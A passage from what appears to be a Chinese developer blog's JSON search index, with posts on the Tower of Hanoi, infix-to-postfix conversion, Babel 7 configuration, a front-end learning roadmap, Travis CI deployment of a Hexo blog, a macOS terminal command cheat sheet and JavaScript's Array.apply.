sourceName,\n      destName,\n      helperName,\n      moves\n    );\n    dest.push(source.pop());\n    const move = {};\n    move[sourceName] = source.toString();\n    move[helperName] = helper.toString();\n    move[destName] = dest.toString();\n    moves.push(move);\n    towerOfHanoi(\n      plates - 1,\n      helper,\n      source,\n      dest,\n      helperName,\n      sourceName,\n      destName,\n      moves\n    );\n  }\n  return moves;\n}\n\nfunction hanoiStack(plates) {\n  const source = new Stack2();\n  const dest = new Stack2();\n  const helper = new Stack2();\n\n  for (let i = plates; i > 0; i--) {\n    source.push(i);\n  }\n\n  return towerOfHanoi(plates, source, helper, dest, \"source\", \"helper\", \"dest\");\n}\n\n// function hanoi0(plates, source, helper, dest, moves = []) {\n//   if (plates <= 0) {\n//     return moves;\n//   }\n//   if (plates === 1) {\n//     moves.push([source, dest]);\n//   } else {\n//     hanoi(plates - 1, source, dest, helper, moves);\n//     moves.push([source, dest]);\n//     hanoi(plates - 1, helper, source, dest, moves);\n//   }\n//   return moves;\n// }\n\nfunction hanoi(n, x, y, z, moves = []) {\n  let move = function(id, from, to) {\n    console.log(id + \"号盘从\" + from + \"移动到\" + to);\n    moves.push([from, to]);\n  };\n  if (n > 0) {\n    hanoi(n - 1, x, z, y, moves);\n    move(n, x, z);\n    hanoi(n - 1, y, x, z, moves);\n  }\n  return moves;\n}\n\nconsole.log(hanoiStack(3));\nconsole.log(hanoi(3, \"A\", \"B\", \"C\"));\n```\n\n# 参考\n","tags":["基础"],"categories":["数据结构与算法"]},{"title":"数据结构与算法@中缀式转后缀式","url":"%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%40%E4%B8%AD%E7%BC%80%E5%BC%8F%E8%BD%AC%E5%90%8E%E7%BC%80%E5%BC%8F%2F","content":"\n# 概述\n\n算术表达式中缀式转后缀式，例如\"A+(B-C/D)_E\" => \"ABCD/-E_+\" ; \"A+B-C/D\" => \"AB+CD/-\"。\n算法思路：https://blog.csdn.net/allinone99/article/details/81297098\n\n<!-- more -->\n\n# 详述\n\n```js\nfunction infix2suffix(infixExp) {\n  // 判断操作符方法\n  let isOperator = function(val) {\n    return [\"+\", \"-\", \"*\", \"/\", \"^\", \"(\", \")\"].indexOf(val) !== -1;\n  };\n  // 计算优先级方法\n  let getPriority = function(val) {\n    let result = 0;\n    switch (val) {\n      case \"^\":\n        result = 3;\n        break;\n      case \"*\":\n      case \"/\":\n        result = 2;\n        break;\n      case \"+\":\n      case \"-\":\n        result = 1;\n        break;\n      default:\n        break;\n    }\n    return result;\n  };\n\n  // 操作符存放栈\n  let operatorStack = new Stack();\n  let suffixExp = \"\";\n  for (let i = 0; i < infixExp.length; i++) {\n    const char = infixExp[i];\n\n    if (isOperator(char)) {\n      if (\n        char === \"(\" ||\n        operatorStack.length === 0 ||\n        getPriority(char) > getPriority(operatorStack.peek())\n      ) {\n        operatorStack.push(char);\n      } else if (char === \")\") {\n        while (!operatorStack.isEmpty()) {\n          if (operatorStack.peek() === \"(\") {\n            operatorStack.pop();\n            break;\n          } else {\n            suffixExp += operatorStack.pop();\n          }\n        }\n      } else {\n        suffixExp += operatorStack.pop();\n        operatorStack.push(char);\n      }\n    } else {\n      suffixExp += char;\n    }\n  }\n  // 读取完成，则将栈中剩余的运算符依次弹出到后缀表达式\n  while (!operatorStack.isEmpty()) {\n    suffixExp += operatorStack.pop();\n  }\n  return suffixExp;\n}\n\nlet exp1 = \"A+(B-C/D)*E\";\nlet exp2 = \"a+b*c+(d*e+f)*g\";\nlet exp3 = \"A+B-C/D\";\nconsole.log(exp1 + \" => \" + infix2suffix(exp1));\nconsole.log(exp2 + \" => \" + infix2suffix(exp2));\nconsole.log(exp3 + \" => \" + infix2suffix(exp3));\n```\n\n# 参考\n","tags":["基础"],"categories":["数据结构与算法"]},{"title":"数据结构与算法@总览","url":"%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%40%E6%80%BB%E8%A7%88%2F","content":"\n# 概述\n\n数据结构是解决以什么结构、层次、形式存储数据，算法是解决以什么方法去执行存储动作。我们要学的其实是前人经过实践总结、抽象出的一套高效的方法论。其实“条条道路通罗马”，我们需要掌握的是怎么分析出最近的“路”以及记住常见的“路”。\n\n最常用的数据结构与算法有：数组、链表、栈、队列、散列表、二叉树、堆、跳表、图、Trie 树；递归、排序、二分查找、搜索、哈希算法、贪心算法、分治算法、回溯算法、动态规划、字符串匹配算法。\n\n<!-- more -->\n\n# 详述\n\n![总览](overview.jpg)\n\n# 参考\n\n极客时间——数据结构与算法之美\n","tags":["基础"],"categories":["数据结构与算法"]},{"title":"计算机组成原理——总览","url":"%2F2019-04-30-computer-organization-overview%2F","content":"\n# 概述\n\n编程好多年，越来越发现上层的应用技术日新月异，但是基本原理都是一样的。浮华之后，突然很想静下来好好梳理下底层的一些知识。作为开篇，先来个整体的知识地图，以后可以按图索骥，不断完善各个知识点。\n![计算机组成原理知识地图](0.jpg)\n\n<!-- more -->\n\n# 详述\n\n## 硬件设备组成\n\n1. CPU：最核心配件，三大件之一，全名叫中央处理器（Central Processing Unit）。计算机的所有“计算”都是由 CPU 来进行的。\n2. 内存：三大件之一，你撰写的程序、打开的浏览器、运行的游戏，都要加载到内存里才能运行。程序读取的数据、计算得到的结果，也都要放在内存里。\n3. 主板：三大件之一，CPU 和内存及其他配件的载体。主板有很多插槽，可以放各种对应的配件。主板的芯片组（Chipset）和总线（Bus）解决了 CPU 和内存之间如何通信的问题。芯片组控制了数据传输的流转，也就是数据从哪里到哪里的问题。总线则是实际数据传输的高速公路。因此，总线速度（Bus Speed）决定了数据能传输得多快。\n4. 硬盘：外部存储设备。\n5. 鼠标、键盘：输入设备；\n6. 显示器：输出设备。\n   有了三大件，只要配上电源供电，计算机差不多就可以跑起来了。但是使用还缺少输入输出设备（I/O 设备），加了这个才能输入指令，输出结果。\n\n另外还有一个很特殊的配件显卡（Graphics Card）。有内置显卡和独立显卡，如果你用计算机玩游戏，做图形渲染或者跑深度学习应用，你多半就需要买一张单独的显卡，插在主板上。显卡之所以特殊，是因为显卡里有除了 CPU 之外的另一个“处理器”，也就是（Graphics Processing Unit，图形处理器），GPU 一样可以做各种“计算”的工作。\n\n## 冯·诺依曼体系结构\n\n![冯·诺依曼体系结构](1.jpg)\n任何一台计算机的任何一个部件都可以归到运算器、控制器、存储器、输入设备和输出设备中，而所有的现代计算机也都是基于这个基础架构来设计开发的。\n\n# 参考\n\n极客时间——深入浅出计算机组成原理\n","tags":["基础"],"categories":["计算机组成原理"]},{"title":"babel7.x使用及新特性测试","url":"%2F2019-04-25-babel7-x-test%2F","content":"\n# 概述\nBabel是一个JavaScript编译器，主要用于将ES6+代码转换为当前和旧浏览器或其他环境中向后兼容的JavaScript版本。本篇主要讲下babel7.x的基本用法及新特性测试，[测试源码](https://github.com/jovysun/babel7.x-test)。\n<!-- more -->\n\n# 详述\n\n## 基本用法\n\n### 常用包介绍\n```shell\n$ npm install @babel/core @babel/preset-env @babel/polyfill @babel/runtime @babel/plugin-transform-runtime -D\n```\n从7.x开始，包名改用命名空间方式，例如不再是`babel-core`而是`@babel/core`；\n\n`@babel/core` 核心工具包，配合插件包可以转换特定语法，例如加上`@babel/plugin-transform-arrow-functions`插件包，可以转换箭头函数语法；\n\n`@babel/preset-env` 智能预置插件包，根据配置参数去自动选择对应插件转换。与第二条说的直接安装对应语法的插件包相比，这个更符合实际场景，通常大家关心的是在什么环境下能运行而不是暴力的直接把高级语法转成低级语法。例如箭头函数在最新chrome下是支持的，在IE11下不支持。如果只要求chrome下使用，那么就没必要转换箭头函数了，还有node环境，如果对应node版本支持的高级语法就没必要转换了。\n\n![IE11](1.jpg) ![chrome](2.jpg)\n\n[更多介绍](https://babeljs.io/docs/en/babel-preset-env)\n\n`@babel/polyfill` 与preset-env区别是，preset-env是高级语法形式转成对应低级语法形式，基本是针对新的语法糖，例如箭头函数转成普通function函数；而polyfill是针对新增加的接口方法用另一种当前环境能支持的方式去实现，例如`findIndex`方法，ES6新加的，ES5没有对应的，想在ES5环境使用只能用polyfill方式。[MDN实现](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/findIndex)。\n\nwebpack打包示例如图：\n```js\n/***/ \"./node_modules/core-js/modules/es6.array.find-index.js\":\n/*!**************************************************************!*\\\n!*** ./node_modules/core-js/modules/es6.array.find-index.js ***!\n\\**************************************************************/\n/*! no static exports found */\n/***/ (function(module, exports, __webpack_require__) {\n\n\"use strict\";\neval(\"\\n// 22.1.3.9 Array.prototype.findIndex(predicate, thisArg = undefined)\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $find = __webpack_require__(/*! ./_array-methods */ \\\"./node_modules/core-js/modules/_array-methods.js\\\")(6);\\nvar KEY = 'findIndex';\\nvar forced = true;\\n// Shouldn't skip holes\\nif (KEY in []) Array(1)[KEY](function () { forced = false; });\\n$export($export.P + $export.F * forced, 'Array', {\\n  findIndex: function findIndex(callbackfn /* , that = undefined */) {\\n    return $find(this, callbackfn, arguments.length > 1 ? arguments[1] : undefined);\\n  }\\n});\\n__webpack_require__(/*! ./_add-to-unscopables */ \\\"./node_modules/core-js/modules/_add-to-unscopables.js\\\")(KEY);\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es6.array.find-index.js?\");\n\n/***/ }),\n```\n[更多介绍](https://babeljs.io/docs/en/babel-polyfill)\n\n`@babel/runtime` 提供统一的模块化的helper，例如编译后的文件中_classCallCheck，_defineProperties，_createClass等函数就是helper。可以类比为我们日常开发中用到的工具函数，这些是可复用的，因此在运行环境最好提取出来。\n`@babel/plugin-transform-runtime` runtime辅助插件，自动把runtime提取的helper引入到代码中。\n\n\n## 配置\nBabel有两种并行的配置文件格式，可以一起使用，也可以单独使用。\n\n### 项目范围的配置（全局配置）\n在最新的`Babel 7.x`，Babel有一个“根”目录的概念，默认为当前工作目录。对于项目范围的配置，Babel将自动搜索`babel.config.js`。这个作为默认配置，可以配置一些全局通用的规则，例如针对node_modules或、引用包文件等。\n\n### 文件相对位置配置（局部配置）\nBabel通过从正在编译的[filename](https://babeljs.io/docs/en/options#filename)开始搜索目录结构来加载.babelrc(和.babelrc.js / package.json# Babel)文件(受下面的警告限制)。这非常强大，因为它允许您为包的子部分创建独立的配置。局部配置优先级高于全局配置，因此最终结果是合并与覆盖。\n\n局部配置边缘情况处理规则：\n1. 一旦包含的目录搜索到package.json即停止搜索，因此相对配置只应用于单个包中。\n2. 正在编译的[filename](https://babeljs.io/docs/en/options#filename)必须在`babelrcRoots`配置项中，否则将完全跳过搜索。\n简言之，.babelrc文件只作用于自己的package中，根目录下的.babelrc文件如果没有在babelrcRoots中配置将被忽略。\n\n\n### useBuiltIns\n\"usage\" | \"entry\" | false, defaults to false.\n\n\"entry\" 指定入口文件中引入`import \"@babel/polyfill\";`，编译后的polyfill代码统一加入该入口文件，示例如下：\nIn\n```JavaScript\nimport \"@babel/polyfill\";\n```\nOut (different based on environment)\n```JavaScript\nimport \"core-js/modules/es7.string.pad-start\";\nimport \"core-js/modules/es7.string.pad-end\";\n```\nwebpack示例：\nIn\n```JavaScript\nentry: ['@babel/polyfill', path.join(__dirname, './src/index.js')],\n```\n```js\n/***/ \"./node_modules/core-js/modules/es7.string.pad-end.js\":\n/*!************************************************************!*\\\n  !*** ./node_modules/core-js/modules/es7.string.pad-end.js ***!\n  \\************************************************************/\n/*! no static exports found */\n/***/ (function(module, exports, __webpack_require__) {\n\n\"use strict\";\neval(\"\\n// https://github.com/tc39/proposal-string-pad-start-end\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $pad = __webpack_require__(/*! ./_string-pad */ \\\"./node_modules/core-js/modules/_string-pad.js\\\");\\nvar userAgent = __webpack_require__(/*! ./_user-agent */ \\\"./node_modules/core-js/modules/_user-agent.js\\\");\\n\\n// https://github.com/zloirock/core-js/issues/280\\nvar WEBKIT_BUG = /Version\\\\/10\\\\.\\\\d+(\\\\.\\\\d+)?( Mobile\\\\/\\\\w+)? Safari\\\\//.test(userAgent);\\n\\n$export($export.P + $export.F * WEBKIT_BUG, 'String', {\\n  padEnd: function padEnd(maxLength /* , fillString = ' ' */) {\\n    return $pad(this, maxLength, arguments.length > 1 ? arguments[1] : undefined, false);\\n  }\\n});\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es7.string.pad-end.js?\");\n\n/***/ }),\n\n/***/ \"./node_modules/core-js/modules/es7.string.pad-start.js\":\n/*!**************************************************************!*\\\n  !*** ./node_modules/core-js/modules/es7.string.pad-start.js ***!\n  \\**************************************************************/\n/*! no static exports found */\n/***/ (function(module, exports, __webpack_require__) {\n\n\"use strict\";\neval(\"\\n// https://github.com/tc39/proposal-string-pad-start-end\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $pad = __webpack_require__(/*! ./_string-pad */ \\\"./node_modules/core-js/modules/_string-pad.js\\\");\\nvar userAgent = __webpack_require__(/*! ./_user-agent */ \\\"./node_modules/core-js/modules/_user-agent.js\\\");\\n\\n// https://github.com/zloirock/core-js/issues/280\\nvar WEBKIT_BUG = /Version\\\\/10\\\\.\\\\d+(\\\\.\\\\d+)?( Mobile\\\\/\\\\w+)? Safari\\\\//.test(userAgent);\\n\\n$export($export.P + $export.F * WEBKIT_BUG, 'String', {\\n  padStart: function padStart(maxLength /* , fillString = ' ' */) {\\n    return $pad(this, maxLength, arguments.length > 1 ? arguments[1] : undefined, true);\\n  }\\n});\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es7.string.pad-start.js?\");\n\n/***/ }),\n```\n\n## Monorepos\n简单理解就是一个总目录下，有多个package，不同的package下的可能有自己的babel配置文件。示例如下图：\n\n![测试项目结构图](3.jpg)\n\n过去的用法比较繁琐，babel7.x针对痛点做了相应的调整。现在的推荐用法是总目录下一个全局配置文件`babel.config.js`，然后各个子package下各一个配置文件`.babelrc.js(.babelrc)`。\n至于父子级间配置文件怎么配合使用，主要体现在两个配置参数：[rootMode](https://babeljs.io/docs/en/options#rootmode)和[babelrcRoots](https://babeljs.io/docs/en/options#babelrcroots)。\n### rootMode\n设定子package搜索`babel.config.js`的规则\n\n`root` 默认值，限定在当前目录。\n`upward` 向上搜索，直到第一次出现`babel.config.js`为止，如果没搜到`babel.config.js`则抛出错误。\n`upward-optional` 向上搜索，没找到则返回`root`设置值对应目录。\n\n测试示例见mod1中的`package.json`，可以改下`--root-mode`的值执行`npm run babel`命令看编译后文件的变化。\n```json\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"babel\": \"npx babel --root-mode upward src --out-dir lib\"\n  }\n```\n### babelrcRoots\n设定根目录中编译子package中的文件是否可用子package的`.babelrc`文件。\n\n测试步骤：\n1. webpack配置entry\n```js\nentry: ['@babel/polyfill', path.join(__dirname, './src/index.js'), './packages/mod2/src/index.js'],\n```\n2. './packages/mod2'下的.babelrc.js文件增加一行打印代码\n```js\nconsole.log('from mod2 babelrc...............')\n```\n3. babel.config.js添加babelrcRoots配置项\n```js\nbabelrcRoots: ['.', './packages/mod2']\n```\n4. 执行编译命令\n```shell\n$ npm run babel\n```\n测试结果如图：\n![示例图4](4.jpg)\n\n去掉babelrcRoots配置项则不会执行mod2下的.babelrc，如图：\n![示例图5](5.jpg)\n\n## 其他\n配置方式：`package.json`、`.babelrc`、`.babelrc.js`、`babel.config.js`。\n\n`.babelrc.js`与`.babelrc`用法基本一样，只是前者支持js代码。\n\n# 参考\nhttps://babeljs.io/docs/en/\n\nhttps://www.jianshu.com/p/0ea6065cb39e\n\nhttps://www.jianshu.com/p/cbd48919a0cc\n\nhttps://segmentfault.com/a/1190000018358854","tags":["工具"],"categories":["前端"]},{"title":"web前端知识图谱2019","url":"%2F2019-04-23-developer-roadmap-2019%2F","content":"\n# 概述\n针对Web前端开发者，知识图谱分为通用部分和前端专有部分。该篇整理自给出的参考文档，主要作备忘及对照梳理自己的知识结构。\n<!-- more -->\n# 详述\n\n## 通用知识\n\n![通用知识图谱](1.jpg)\n\n1. Git\n最流行的版本控制系统之一。没有 Git 再也无法生存。\n\n2. SSH\n它允许你远程登录到另一台主机，这是另一个流行的、每个 Web 开发人员都应该知道的网络概念。\n\n3. HTTP/HTTPS\nHTTP 协议是 Web 的基础，对于 Web 开发人员来说，必须熟悉 HTTP 和 HTTPS。\n\n4. 终端的基本用法：Linux 命令行基础\n不仅仅是 Web 开发人员，对于任何程序员来说，Linux 命令行都是非常非常重要的，我强烈建议你花一些时间来学习它们。\n\n5. 数据结构和算法\n这是任何程序的构建块，更好地了解算法和数据结构是你在下一份工作或当前工作中做得更好的关键。\n\n6. 字符编码\n如果你正在创建全球应用程序，其中显示了世界上许多不同语言的信息，那么你应该精通字符编码。它本质上是告诉浏览器如何显示你的数据。\n\n7. GitHub\n毫无疑问，每个程序员都应该了解 Git 和 Github，因为它们是版本控制和代码库方面的标准。\n\n\n## 专有知识\n\n![专有知识](2.png)\n\n1. Web 开发基础\n显然，如果你想成为一名 Web 开发人员，那么你应该了解互联网、Web 应用程序、HTTP 之类的协议以及 Web 开发的基础知识。\n\n2. HTML 和 CSS\nHTML 和 CSS 是任何网站的基础。HTML 提供了结构，而 CSS 提供了样式，使它们看起来更好看，更具有视觉吸引力。如果你想成为一个真正的前端开发人员，那么你必须掌握这两方面的知识。\n\n3. JavaScript\n就像面向对象编程的四大支柱（抽象、封装、多态和继承）一样，Web 开发也有三大支柱，即 HTML、CSS 和 JavaScript。前两个提供了结构和样式，但正是 JavaScript 通过添加交互性使它们变得有生气。\n\n4. TypeScript\n就像我们有 C 和 C++ 一样，TypeScript 可以看成是 JavaScript++，尽管它不像 C++ 那么流行。TypeScript 的好处在于它在 JavaScript 代码中增加了类型安全，这意味着你可以在开发阶段捕获与 JavaScript 类型相关的错误。它还使得为 JavaScript 开发面向对象代码变得更容易。\n\n5. Angular\n人们使用纯 HTML、CSS 和 JavaScript 构建网站的日子已经一去不复返了。如今，大部分工作都是由 Angular、React JS 或 Vue.js 这样的框架完成的。它们不仅提供了存储代码的结构，而且使快速开发 Web 应用程序变得很容易。Angular 由谷歌支持，因此，学习 Angular 对于任何现代 Web 开发人员来说都是一个不错的选择。\n\n6. React JS\n与 Angular 类似，React 也是开发 Web 应用程序的一个流行库。它允许你编写可重用的组件，然后你可以使用这些组件创建现代风格的交互式 Web 页面。就像 Angular 由谷歌支持一样，React 也有 Facebook 支持，因此非常受欢迎。\n\n7. Vue.js\nVue 或 Vue JS 在去年真的加快了步伐，越来越多的人推荐和使用 Vue.js。我仍然是 Vue 的初学者，可能需要一些时间来学习并迁移到基于 Vue 的应用程序中。\n\n关于前端开发者应该学哪些内容，强烈推荐大家去读这篇文章，里面有非常详细的前端开发者学习指南：\nhttps://frontendmasters.com/books/front-end-handbook/2019/\n\n# 参考\nhttps://github.com/kamranahmedse/developer-roadmap\nhttps://mp.weixin.qq.com/s/mz3yoUvPc6R_4byA3wKCJw","tags":["备忘"],"categories":["前端"]},{"title":"Travis CI实现hexo博客自动部署","url":"%2F2019-04-18-travis-hexo%2F","content":"# 前言\n\n更新2020.05.14：超简单的[官方教程](https://docs.travis-ci.com/user/tutorial/#to-get-started-with-travis-ci-using-github)。\n更新：发现另一种更方便的[实现方法](https://juejin.im/post/5c415a25f265da61285a6010)。\n\n\n此篇默认读者已经使用过hexo写过几篇博文，并且已经创建好SSH key。\n\n# 概述\nhexo写博客，为了多端同步我们会切个开发分支，每次写完都要提交代码，同时还得部署，文章多了，等待部署时间较长。能不能提交后自动部署呢？\n<!-- more -->\n\n# 详述\nTravis CI 是一个持续集成(Continuous integration，简称CI)的工具。它可以在公共的 Github 仓库上免费使用。\n\n1. [Travis CI](https://travis-ci.org)注册账号，可以github账号授权登录；\n2. 根目录创建`travis.yml`和`.travis`文件夹；\n3. 安装travis（macOS系统为例）并登录；\n    ```shell\n    $ sudo gem install travis\n    $ travis login --auto\n    ```\n4. 加密私钥\n    ```shell\n    $ travis encrypt-file ~/.ssh/id_rsa --add\n    ```\n    会在当前目录生成`id_rsa.enc`文件，并且`.travis.yml`文件中自动生成如下代码：\n    ```\n    before_install:\n    - openssl aes-256-cbc -K $encrypted_830d3b21a25d_key -iv $encrypted_830d3b21a25d_iv\n      -in ~/.ssh/id_rsa.enc -out ~/.ssh/id_rsa -d\n    ```\n5. 在`.travis`文件夹下创建ssh_config文件，并添加代码如下：\n    ```\n    Host github.com\n        User git\n        StrictHostKeyChecking no\n        IdentityFile ~/.ssh/id_rsa\n        IdentitiesOnly yes\n    ```\n6. 进入Travis CI网站设置页面，打开我们要集成的库，示例如下：\n    ![示例图](1.png)\n\n7. 配置`.travis.yml`文件，示例如下：\n\n    ```yml\n    # 配置语言及相应版本\n    language: node_js\n\n    node_js:\n      - \"10\"\n\n    #项目所在分支\n    # branches:\n    #   only:\n    #   - master\n\n    # 缓存\n    cache:\n      directories:\n        - node_modules\n\n    before_install:\n    - openssl aes-256-cbc -K $encrypted_eced380b421a_key -iv $encrypted_eced380b421a_iv\n      -in id_rsa.enc -out ~/.ssh/id_rsa -d\n    # 改变文件权限\n    - chmod 600 ~/.ssh/id_rsa \n    # 配置 ssh\n    - eval $(ssh-agent)\n    - ssh-add ~/.ssh/id_rsa\n    - cp .travis/ssh_config ~/.ssh/config\n    # 配置 git 替换为自己的信息\n    - git config --global user.name 'jovysun'\n    - git config --global user.email jovy_sun@163.com\n\n\n    # 安装依赖\n    install:\n    - npm install hexo-cli -g\n    - npm install\n\n    # 部署的命令\n    script:\n    - npm run deploy  # hexo clean && hexo g -d\n\n    ```\n8. 打开package.json文件添加hexo部署命令，示例如下：\n    ```json\n      \"scripts\": {\n        \"deploy\": \"hexo clean && hexo g -d\"\n      }\n    ```\n\n这样每次提交完代码，就会自动触发Travis CI的自动集成即自动部署。\n# 参考\nhttps://segmentfault.com/a/1190000004667156","tags":["CI/CD"],"categories":["其他"]},{"title":"macOS-cmd","url":"%2FmacOS-cmd%2F","content":"\n# 概述\n\n<!-- more -->\n\n# 详述\n\n# 参考\n\n\n# 概述\n\n<!-- more -->\n# 详述\n## 查看公钥\n```bash\ncd ~/.ssh\nls\ncat id_rsa.pub\n```\n\n## MacOS 常用终端命令大全：\n\n目录操作\n\n命令——功能描述——示例\n\nmkdir——创建一个目录——mkdir dirname\n\nrmdir——删除一个目录——rmdir dirname\n\nmvdir——移动或重命名一个目录——mvdir dir1 dir2\n\ncd——改变当前目录——cd dirname\n\npwd——显示当前目录的路径名——pwd\n\nls——显示当前目录的内容——ls -la\n\ndircmp——比较两个目录的内容——dircmp dir1 dir2\n\n\n文件操作\n\n命令——功能描述——示例\n\ncat——显示或连接文件————cat filename\n\npg分页格式化显示文件内容——pg filename\n\nmore——分屏显示文件内容——more filename\n\nod——显示非文本文件的内容——od -c filename\n\ncp——复制文件或目录——cp file1 file2\n\nrm——删除文件或目录——rm filename\n\nmv——改变文件名或所在目录——mv file1 file2\n\nln——联接文件——ln -s file1 file2\n\nfind——使用匹配表达式查找文件——find . -name “*.c” -print\n\nfile——显示文件类型——file filename\n\nopen——使用默认的程序打开文件——open filename（open . 打开当前目录）\n\n\n选择操作\n\n命令——功能描述——示例\n\nhead——显示文件的最初几行——head -20 filename\n\ntail——显示文件的最后几行——tail -15 filename\n\ncut——显示文件每行中的某些域——cut -f1,7 -d: /etc/passwd\n\ncolrm——从标准输入中删除若干列——colrm 8 20 file2\n\npaste——横向连接文件——paste file1 file2\n\ndiff——比较并显示两个文件的差异——diff file1 file2\n\nsed————非交互方式流编辑器——sed “s/red/green/g” filename\n\ngrep——在文件中按模式查找——grep “^[a-zA-Z]” filename\n\nawk——在文件中查找并处理模式——awk ‘{print 111}’ filename\n\nsort——排序或归并文件——sort -d -f -u file1\n\nuniq——去掉文件中的重复行——uniq file1 file2\n\ncomm——显示两有序文件的公共和非公共行——comm file1 file2\n\nwc——统计文件的字符数、词数和行数——wc filename\n\nnl——给文件加上行号——nl file1 >file2\n\n\n安全操作\n\n命令——功能描述——示例\n\npasswd——修改用户密码——passwd\n\nchmod——改变文件或目录的权限——chmod ug+x filename\n\numask————定义创建文件的权限掩码——umask 027\n\nchown——改变文件或目录的属主——chown newowner filename\n\nchgrp——改变文件或目录的所属组——chgrp staff filename\n\nxlock——给终端上锁——xlock -remote\n\n\n编程操作\n\n命令——功能描述——示例\n\nmake——维护可执行程序的最新版本——make\n\ntouch——更新文件的访问和修改时间——touch -m 05202400 filename\n\ndbx——命令行界面调试工具——dbx a.out\n\nxde——图形用户界面调试工具——xde a.out\n\n\n进程操作\n\n命令——功能描述——示例\n\nps——显示进程当前状态——ps u\n\nkill——终止进程——kill -9 30142\n\nnice——改变待执行命令的优先级——nice cc -c *.c\n\nrenice——改变已运行进程的优先级——renice +20 32768\n\n\n时间操作\n\n命令——功能描述——示例\n\ndate——显示系统的当前日期和时间——date\n\ncal——显示日历——cal 8 1996\n\ntime——统计程序的执行时间——time a.out\n\n\n网络与通信操作\n\n命令——功能描述——示例\n\ntelnet——远程登录——telnet hpc.sp.net.edu.cn\n\nrlogin——远程登录——rlogin hostname -l username\n\nrsh——在远程主机执行指定命令——rsh f01n03 date\n\nftp——在本地主机与远程主机之间传输文件——ftp ftp.sp.net.edu.cn\n\nrcp——在本地主机与远程主机 之间复制文件——rcp file1 host1:file2\n\nping——给一个网络主机发送 回应请求——ping hpc.sp.net.edu.cn\n\nmail——阅读和发送电子邮件——mail\n\nwrite——给另一用户发送报文——write username pts/1\n\nmesg——允许或拒绝接收报文——mesg n\n\n\nKorn Shell 命令\n\n命令——功能描述——示例\n\nhistory——列出最近执行过的 几条命令及编号——history\n\nr——重复执行最近执行过的 某条命令——r -2\n\nalias——给某个命令定义别名——alias del=rm -i\n\nunalias——取消对某个别名的定义——unalias del\n\n\n其它命令\n\n命令——功能描述——示例\n\nuname——显示操作系统的有关信息——uname -a\n\nclear——清除屏幕或窗口内容——clear\n\nenv——显示当前所有设置过的环境变量——env\n\nwho——列出当前登录的所有用户——who\n\nwhoami——显示当前正进行操作的用户名——whoami\n\ntty——显示终端或伪终端的名称——tty\n\nstty——显示或重置控制键定义——stty -a\n\ndu——查询磁盘使用情况——du -k subdir\n\ndf——显示文件系统的总空间和可用空间——df /tmp\n\nw——显示当前系统活动的总信息——w\n\n\n一些常用技巧\n\n所以你可以使用▲（上箭头）或▼（下箭头）来上下移动，\n使用　空格键 来翻页，输入/和关键字来按照关键字搜索\n按Q来退出使用指南页面\ntab按键自动补全唯一路径\n中止一个错误的或者发疯的命令，可以使用组合键control + C。\n你可以在执行前编辑命令，只需要使用箭头和键盘上的其他字母。\n没有输入任何命令时，你可以用▲和▼来浏览历史命令。同样可以编辑和再次执行。\n你也可以使用history命令查看历史记录。\n你可以使用组合键control + L清屏。\n# 参考","tags":["HTML"],"categories":["其他"]},{"title":"深入理解Array.apply(null, {length: 20})","url":"%2F2019-04-17-Array-apply-null-length-20%2F","content":"\n# 概述\n学习Vue[渲染函数](https://cn.vuejs.org/v2/guide/render-function.html)章节，有段说明是用渲染函数渲染20个相同的段落：\n```js\nrender: function (createElement) {\n  return createElement('div',\n    Array.apply(null, { length: 20 }).map(function () {\n      return createElement('p', 'hi')\n    })\n  )\n}\n```\n对于`Array.apply(null, { length: 20 })`的用法有些费解，于是查资料研究了下。\n<!-- more -->\n\n# 详述\n\n## 核心知识点\n1. 构造函数也可以像普通函数一样调用，`Array(1, 2, 3)`结果为`[1, 2, 3]`；\n2. apply方法的第一个参数为null或者undefined等价于全局对象（非严格模式）；\n3. apply方法的第二个参数`{ length: 20 }`为类数组；\n4. 浏览器环境下等价于`window.Array(undefined, undefined, undefined, ...)`。\n\n## 深究apply\napply()方法调用一个具有给定this值的函数，以及作为一个数组（或类似数组对象）提供的参数。\n\n语法为`func.apply(thisArg, [argsArray])`。\n\nthisArg：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动替换为指向全局对象。浏览器环境下，这个值为null、undefined和window是等价的，测试结果如下：\n\n![示例图](3.jpg)\n\nargsArray：一个数组或者类数组对象，这里是类数组，关于类数组，[MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/apply)有这样一段描述：\n\n> 从 ECMAScript 第5版开始，可以使用任何种类的类数组对象，就是说只要有一个 length 属性和(0..length-1)范围的整数属性。例如现在可以使用 NodeList 或一个自己定义的类似 {'length': 2, '0': 'eat', '1': 'bananas'} 形式的对象。\n\n测试结果如下：\n\n![示例图](4.jpg)\n\n## `Array.apply(null, { length: 20 })`与`Array(20)`\n两者的测试结果如下：\n\n![示例图一](1.jpg)\n\n从结果可以看出前者是声明了一个长度为20的数组，并且初始化每个值为`undefined`；后者只是声明了一个长度为20的数组，值为`empty`，等价于`new Array(20)`。\n\n而[map()](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map)方法是针对数组中的每个**元素**进行迭代执行函数，最终返回一个新的数组，既然后者没有元素，map也就无意义了，测试结果如下：\n\n![示例图二](2.jpg)","tags":["JavaScript"],"categories":["前端"]},{"title":"怎么在App和Web中使用ae动画","url":"%2F2019-04-12-ae-lottie-demo%2F","content":"\n# 